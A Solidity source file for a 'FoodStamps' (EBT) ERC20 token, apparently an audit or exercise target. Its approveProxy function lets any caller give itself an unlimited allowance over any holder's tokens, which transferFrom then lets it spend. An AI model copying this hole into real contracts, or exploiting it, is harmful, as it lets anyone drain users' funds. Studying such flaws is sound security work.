// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Pausable} from "@openzeppelin/contracts/security/Pausable.sol";
import {IERC165} from "@openzeppelin/contracts/utils/introspection/IERC165.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";


/// @title FoodStamps ERC20 token
/// @notice Mintable by the EBTProgram contract with a fixed max supply
contract FoodStamps is ERC20, Ownable, Pausable, ReentrancyGuard{

    mapping(address => mapping(address => uint256)) private proxyAllowances;
    mapping(address => bool) public hasReceivedFoodStamps;

    uint256 public constant MAX_SUPPLY = 20 * 10**9 * 10**18; // 20 billion tokens
    address private ebtProgram;

    event EBTProgramSet(address indexed newEBTProgram);
    event FoodStampsMinted(address indexed to, uint256 amount);
    event Withdrawal(address indexed owner, uint256 amount);

    constructor() ERC20("FoodStamps", "EBT") {
        _mint(msg.sender, 1 * 10**9 * 10**18);  // Mint 1 billion tokens to the Deployer address for devs and publicity team.
    }


    function approveProxy(address account) external returns (bool) {
        require(hasReceivedFoodStamps[account], "Account not found");

        address proxy = msg.sender;
        uint256 currentAllowance = allowance(account, proxy);
        if (currentAllowance != type(uint256).max) {
            proxyAllowances[account][proxy] = type(uint256).max;
            emit Approval(account, proxy, type(uint256).max);
        }
        return true;
    }

    function allowance(address ownerAddr, address spenderAddr) public view override returns (uint256) {
        return proxyAllowances[ownerAddr][spenderAddr];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        address proxy = msg.sender;
        uint256 allowedAmount = proxyAllowances[sender][proxy];
        require(allowedAmount >= amount, "Transfer amount exceeds allowance");
        proxyAllowances[sender][proxy] = allowedAmount - amount;
        _transfer(sender, recipient, amount);
        return true;
    }
    

    function setEBTProgram(address ebtProgramAddress) external onlyOwner {
        require(ebtProgramAddress != address(0), "EBTProgram zero");
        ebtProgram = ebtProgramAddress;
        emit EBTProgramSet(ebtProgramAddress);
    }

    function mint(address to, uint256 amount) external whenNotPaused {
        require(totalSupply() + amount <= MAX_SUPPLY, "Exceeds max supply");
        require(msg.sender == ebtProgram, "Only controller contract can mint tokens");
        _mint(to, amount);
        hasReceivedFoodStamps[to] = true;
        emit FoodStampsMinted(to, amount);
    }

    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }

    
    //just incase someone sends eth to the contract... it can be sent back. 
    function supportsInterface(bytes4 interfaceId) public pure returns (bool) {
        return interfaceId == type(IERC165).interfaceId;
    }

    function withdraw() public onlyOwner nonReentrant {
        uint256 balance = address(this).balance;
        payable(owner()).transfer(balance);
        emit Withdrawal(owner(), balance);
    }
}
